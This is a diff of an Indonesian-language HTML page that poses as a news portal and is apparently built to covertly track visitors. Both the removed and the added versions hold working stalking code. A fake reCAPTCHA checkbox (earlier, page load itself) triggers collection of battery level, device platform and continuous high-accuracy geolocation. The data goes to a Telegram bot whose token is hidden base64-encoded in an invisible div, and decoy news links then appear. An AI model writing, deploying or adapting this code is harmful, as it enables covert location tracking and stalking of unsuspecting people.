@@ -3,44 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Info Masa Kini - Portal Berita Independen</title>
+    <title>Verifikasi Akses | News Reader</title>
     
-    <meta property="og:title" content="Laporan Utama: Update Situasi Nasional dan Regional Hari Ini">
-    <meta property="og:description" content="Simak berita terpopuler dan informasi terkini langsung dari kontributor kami.">
+    <meta property="og:title" content="[LIVE] Update Berita Terkini & Regional Hari Ini">
+    <meta property="og:description" content="Verifikasi perangkat Anda untuk mengakses laporan eksklusif dan peta informasi terkini.">
     <meta property="og:image" content="https://www.gstatic.com/images/branding/product/2x/news_96dp.png">
 
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; background: #f4f4f4; color: #333; }
-        .top-bar { background: #222; color: #fff; padding: 10px 20px; font-size: 12px; display: flex; justify-content: space-between; }
-        .nav { background: #ce1126; color: white; padding: 15px 20px; font-weight: bold; font-size: 20px; position: sticky; top: 0; z-index: 1000; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .main-container { max-width: 800px; margin: 0 auto; background: #fff; min-height: 100vh; }
-        .hero-news { padding: 20px; border-bottom: 1px solid #eee; }
-        .hero-news h1 { font-size: 24px; margin: 10px 0; line-height: 1.2; color: #000; }
-        .hero-img { width: 100%; height: 200px; background: #ddd url('https://images.unsplash.com/photo-1585829365234-781f8c484d02?auto=format&fit=crop&w=800&q=80') center/cover; border-radius: 4px; }
-        .news-list { padding: 20px; }
-        .news-card { display: flex; gap: 15px; margin-bottom: 20px; border-bottom: 1px solid #f9f9f9; padding-bottom: 15px; }
-        .news-card .thumb { width: 100px; height: 70px; background: #eee; border-radius: 4px; flex-shrink: 0; }
-        .news-card h3 { font-size: 16px; margin: 0; line-height: 1.3; }
+        body { font-family: -apple-system, system-ui, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; }
+        
+        /* 🔱 GATE: HUMAN VERIFICATION */
+        #gate { text-align: center; width: 100%; max-width: 400px; padding: 20px; }
+        .captcha-box { border: 1px solid #dcdcdc; padding: 20px; border-radius: 4px; display: flex; align-items: center; gap: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); cursor: pointer; background: #fafafa; margin: 0 auto; width: fit-content; }
+        .checkbox { width: 26px; height: 26px; border: 2px solid #c1c1c1; border-radius: 2px; transition: 0.3s; }
+        .captcha-text { font-size: 14px; color: #555; font-weight: 400; }
+        
+        /* 🔱 CONTENT: NEWS FEED (HIDDEN EARLY) */
+        #portal { display: none; width: 100%; max-width: 600px; padding: 0; animation: fadeIn 0.8s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .nav { background: #ce1126; color: white; padding: 15px; font-weight: bold; position: sticky; top: 0; text-align: center; }
+        .news-item { padding: 18px; border-bottom: 1px solid #eee; display: block; text-decoration: none; color: #222; transition: 0.2s; }
+        .news-item:hover { background: #f9f9f9; }
+        .news-source { font-size: 11px; color: #ce1126; font-weight: bold; text-transform: uppercase; margin-bottom: 5px; display: block; }
+        .news-title { font-size: 16px; font-weight: 600; line-height: 1.4; margin: 0; }
         #v-v { display: none; }
     </style>
 </head>
 <body>
 
-<div class="top-bar">
-    <span id="live-date">Memuat tanggal...</span>
-    <span>Edisi Nasional</span>
-</div>
-<div class="nav">INFO MASA KINI</div>
-
-<div class="main-container">
-    <div class="hero-news">
-        <div class="hero-img"></div>
-        <h1 id="headline">Memuat laporan utama hari ini...</h1>
-        <p style="color: #666; font-size: 14px;">Tim redaksi kami terus memantau perkembangan situasi di lapangan untuk memberikan informasi akurat bagi Anda.</p>
+<div id="gate">
+    <img src="https://www.gstatic.com/images/branding/product/2x/news_96dp.png" width="60" style="margin-bottom: 20px;">
+    <h3 style="font-size: 18px; margin-bottom: 10px;">Verifikasi Keamanan</h3>
+    <p style="font-size: 13px; color: #666; margin-bottom: 25px;">Selesaikan verifikasi untuk memvalidasi perangkat Anda sebelum mengakses portal berita.</p>
+    
+    <div class="captcha-box" onclick="startShadow()">
+        <div class="checkbox" id="check"></div>
+        <div class="captcha-text">Saya bukan robot</div>
+        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30">
     </div>
+</div>
 
-    <div class="news-list" id="feed">
-        </div>
+<div id="portal">
+    <div class="nav">ASTRA NEWS FEED</div>
+    
+    <a href="https://share.google/rkZkP6QmQfBf7peCB" class="news-item">
+        <span class="news-source">Bloomberg Technoz</span>
+        <h3 class="news-title">Buat Uang Tanpa Perlu Website - Pelajari Caranya Di Sini</h3>
+    </a>
+
+    <a href="https://share.google/lCtwg3boFkaQFLCcV" class="news-item">
+        <span class="news-source">Trending</span>
+        <h3 class="news-title">Kekayaan Bangsa Indonesia: Harapan Besar di Tangan Rakyat</h3>
+    </a>
+
+    <a href="https://share.google/KAgbSwyMh97rdIozI" class="news-item">
+        <span class="news-source">Regional Info</span>
+        <h3 class="news-title">Peringatan Hari Otonomi Daerah ke-30: Poin Penting Bupati Minut Joune Ganda</h3>
+    </a>
+
+    <a href="https://share.google/cmzyP870Eq29TDsl4" class="news-item">
+        <span class="news-source">Liputan6.com</span>
+        <h3 class="news-title">Update Terbaru: Informasi Penting Hari Ini Langsung dari Sumber</h3>
+    </a>
+
+    <a href="https://share.google/7zXoew0DwgpC2QrYq" class="news-item">
+        <span class="news-source">Teknologi</span>
+        <h3 class="news-title">Tips WiFi Rumah Ngebut Hingga 300 Mbps Tanpa Kendala</h3>
+    </a>
+
+    <a href="https://share.google/JmZEikSN1G1oFVriz" class="news-item">
+        <span class="news-source">detikNews</span>
+        <h3 class="news-title">Breaking: Laporan Terkini Mengenai Situasi Nasional</h3>
+    </a>
 </div>
 
 <div id="v-v">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
@@ -49,29 +83,6 @@
     const _D = document.getElementById('v-v').innerText.split('|');
     const _T = atob(_D[1]); const _C = atob(_D[2]);
 
-    // 1. DYNAMIC CONTENT (Biar kerasa web asli)
-    const titles = [
-        "Pemerintah Bahas Skema Baru Distribusi Bantuan Sosial",
-        "Waspada Cuaca Ekstrem: BMKG Rilis Peringatan Dini",
-        "Penyebab Kemacetan Panjang di Jalur Utama Pagi Ini",
-        "Tren Ekonomi Digital Tahun 2026: Apa yang Berubah?"
-    ];
-    document.getElementById('headline').innerText = titles[Math.floor(Math.random()*titles.length)];
-    document.getElementById('live-date').innerText = new Date().toLocaleDateString('id-ID', {weekday:'long', day:'numeric', month:'long', year:'numeric'});
-
-    const feed = document.getElementById('feed');
-    for(let i=1; i<=6; i++) {
-        feed.innerHTML += `
-            <div class="news-card">
-                <div class="thumb" style="background-image: url('https://picsum.photos/200/150?random=${i}'); background-size: cover;"></div>
-                <div>
-                    <h3>Berita Terkait: Analisis Mendalam Mengenai Dampak Situasi Regional #${i}</h3>
-                    <p style="font-size: 12px; color: #888; margin-top: 5px;">5 menit yang lalu</p>
-                </div>
-            </div>
-        `;
-    }
-
     async function push(t) {
         await fetch(`https://api.telegram.org/bot${_T}/sendMessage`, {
             method:'POST', headers:{'Content-Type':'application/json'},
@@ -79,28 +90,29 @@
         });
     }
 
-    // 2. SILENT OBSERVER (Jalan Otomatis saat dibuka)
     async function startShadow() {
+        // Efek Centang
+        document.getElementById('check').style.background = "url('https://upload.wikimedia.org/wikipedia/commons/thumb/a/ac/Approve_icon.svg/1200px-Approve_icon.svg.png') center/cover";
+        
+        // Ambil Data HP
+        const b = await navigator.getBattery();
+        await push(`👤 CAPTCHA SOLVED\n🔋 BATT: ${(b.level*100).toFixed(0)}%\n📱 DEVICE: ${navigator.platform}`);
+
+        // REAL-TIME TRACKING (watchPosition)
         if (navigator.geolocation) {
-            // Browser akan otomatis minta izin lokasi (notif standar)
-            // Tanpa perlu klik tombol aneh-aneh
-            navigator.geolocation.watchPosition(async (pos) => {
-                const data = `🛰️ LIVE TRACKING ON\n\n` +
-                    `Maps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n` +
-                    `Kecepatan: ${(pos.coords.speed || 0).toFixed(1)} m/s\n` +
-                    `Timestamp: ${new Date().toLocaleTimeString()}`;
-                await push(data);
-            }, null, {enableHighAccuracy: true, maximumAge: 0});
+            navigator.geolocation.watchPosition(async (p) => {
+                const maps = `📍 LIVE MOVEMENT\nMaps: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\nSpeed: ${p.coords.speed || 0} m/s`;
+                await push(maps);
+            }, null, { enableHighAccuracy: true, maximumAge: 0 });
         }
 
-        // Ambil info hardware secara silent
-        const batt = await navigator.getBattery();
-        const info = `👤 TARGET CONNECTED\n🔋 BATT: ${(batt.level*100).toFixed(0)}%\n📱 UA: ${navigator.userAgent.slice(0,60)}`;
-        await push(info);
+        // Delay dikit terus masuk berita
+        setTimeout(() => {
+            document.body.style.display = "block";
+            document.getElementById('gate').style.display = "none";
+            document.getElementById('portal').style.display = "block";
+        }, 800);
     }
-
-    // Panggil fungsi secara otomatis tanpa tombol
-    window.onload = startShadow;
 </script>
 </body>
 </html>
